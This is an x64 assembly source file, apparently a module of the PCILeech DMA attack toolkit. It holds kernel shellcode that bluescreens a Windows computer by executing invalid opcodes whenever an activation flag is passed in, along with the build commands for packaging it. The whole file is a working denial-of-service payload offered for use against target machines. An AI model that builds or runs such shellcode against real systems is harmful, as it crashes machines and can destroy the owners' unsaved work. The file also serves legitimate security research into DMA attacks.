; wx64_psblue.asm : shellcode assembly to just bluescreen the computer due to invalid opcodes
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;
; compile with:
; ml64 wx64_psblue.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main
; shellcode64.exe -o wx64_psblue.exe "BLUE SCREEN THE MACHINE!                                         \n=================================================================\nREQUIRED OPTIONS:                                                \n  -0   : Set to one (1) in order to activate.                    \n         Example: '-0 1'.                                        \n=================================================================\n"
;

.CODE

; ----------------------------------------------------
; bluescreen the computer if first qword in dataIn is not 0.
; rcx = 1st parameter (PKMDDATA)
; rdx = 2nd parameter (ptr to dataIn)
; r8  = 3rd parameter (ptr to dataOut)
; ----------------------------------------------------
main PROC
	MOV rax, [rdx-00h]
	TEST rax, rax
	JNZ bluescreen
	RET
	bluescreen:
	dq 0ffffffffffffffffh, 0ffffffffffffffffh
main ENDP

END
